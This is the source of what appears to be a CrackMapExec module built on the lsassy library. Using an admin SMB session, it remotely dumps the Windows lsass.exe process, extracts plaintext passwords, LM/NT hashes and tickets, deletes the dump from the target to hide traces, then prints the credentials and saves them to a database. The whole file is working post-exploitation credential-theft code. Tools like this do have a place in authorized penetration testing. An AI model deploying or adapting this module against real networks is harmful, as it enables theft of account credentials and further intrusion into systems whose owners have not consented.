# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com [FR]
#  https://en.hackndo.com [EN]


from lsassy import logger
from lsassy.dumper import Dumper
from lsassy.parser import Parser
from lsassy.session import Session
from lsassy.impacketfile import ImpacketFile


class CMEModule:
    name = 'lsassy'
    description = "Dump lsass and parse the result remotely with lsassy"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
            METHOD              Method to use to dump lsass.exe with lsassy
        """
        self.method = 'comsvcs'
        if 'METHOD' in module_options:
            self.method = module_options['METHOD']

    def on_admin_login(self, context, connection):
        logger.init(quiet=True)
        host = connection.host
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        session = Session()
        session.get_session(
            address=host,
            target_ip=host,
            port=445,
            lmhash=lmhash,
            nthash=nthash,
            username=username,
            password=password,
            domain=domain_name
        )

        if session.smb_session is None:
            context.log.error("Couldn't connect to remote host")
            return False

        dumper = Dumper(session, timeout=10).load(self.method)
        if dumper is None:
            context.log.error("Unable to load dump method '{}'".format(self.method))
            return False
        file = dumper.dump()
        if file is None:
            context.log.error("Unable to dump lsass")
            return False

        credentials, tickets = Parser(file).parse()
        file.close()
        ImpacketFile.delete(session, file.get_file_path())
        if credentials is None:
            credentials = []
        credentials = [cred.get_object() for cred in credentials if not cred.get_username().endswith("$")]
        credentials_unique = []
        credentials_output = []
        for cred in credentials:
            if [cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]] not in credentials_unique:
                credentials_unique.append([cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]])
                credentials_output.append(cred)
        self.process_credentials(context, connection, credentials_output)

    def process_credentials(self, context, connection, credentials):
        if len(credentials) == 0:
            context.log.info("No credentials found")
        for cred in credentials:
            self.save_credentials(context, connection, cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"])
            self.print_credentials(context, cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"])

    @staticmethod
    def print_credentials(context, domain, username, password, lmhash, nthash):
        if password is None:
            password = ':'.join(h for h in [lmhash, nthash] if h is not None)
        output = "%s\\%s %s" % (domain, username, password)
        context.log.highlight(output)

    @staticmethod
    def save_credentials(context, connection, domain, username, password, lmhash, nthash):
        host_id = context.db.get_computers(connection.host)[0][0]
        if password is not None:
            credential_type = 'plaintext'
        else:
            credential_type = 'hash'
            password = ':'.join(h for h in [lmhash, nthash] if h is not None)
        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)
